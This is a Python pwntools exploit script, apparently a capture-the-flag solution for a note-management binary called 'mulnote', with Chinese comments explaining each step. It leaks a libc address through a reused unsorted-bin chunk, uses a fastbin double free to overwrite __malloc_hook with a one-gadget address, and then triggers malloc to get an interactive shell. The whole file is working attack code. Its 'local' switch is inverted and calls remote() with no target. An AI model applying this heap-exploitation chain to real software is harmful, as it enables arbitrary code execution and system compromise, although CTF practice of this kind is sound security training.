# encoding: utf-8
from pwn import*

local = 0
if local:
    p = remote()
else:
    p = process('./mulnote')

libc = ELF('libc.so')
offone = 0x4526a

def create(size,note):
    p.sendlineafter('>','C')
    p.sendlineafter('size>',str(size)) #输入后面跟上换行符
    p.sendafter('note>',note) # 这里用sendafter 就是输入的note后面不跟上换行符'\n'(0a)

def edit(index,content):
    p.sendlineafter('>','E')
    p.sendlineafter('index>',str(index))
    p.sendlineafter('note>',str(content))

def show():
    p.sendlineafter('>','S')    


def remove(index):
    p.sendlineafter('>','R')
    p.sendlineafter('>',str(index))

create(0x100,'0')
create(0x10,'1')  #防止chunk0与topchunk合并
remove(0)
create(0x100,'A')  #重新使用刚才的unsorted bin,malloc不会跟新chunk中的内容
show()
p.recvuntil('[0]:\n')
x = p.recv(6)
print x
leak = u64(x.ljust(8,'\x00'))
print hex(leak)
base = leak - 0x3c4b41 #这里是因为libc起始地址后三位为000
print hex(base)
onegadget = base +offone
__malloc_hook = base + libc.symbols['__malloc_hook']
create(0x60, '3')
create(0x60, '4') #double free利用
remove(3)
remove(4)
remove(3)
create(0x60, p64(__malloc_hook - 0x13))  #修改fd指向malloc_hook的前面0x10处，这0x10作为头部(填充3)
create(0x60, 'A')# 填充4
create(0x60, 'A')#再次填充3
create(0x60, '\x00'*0x3 + p64(onegadget))  #刚好修改到malloc_hook前0x3的位置
p.sendlineafter('>','C')
p.sendlineafter('>','12')
p.interactive()
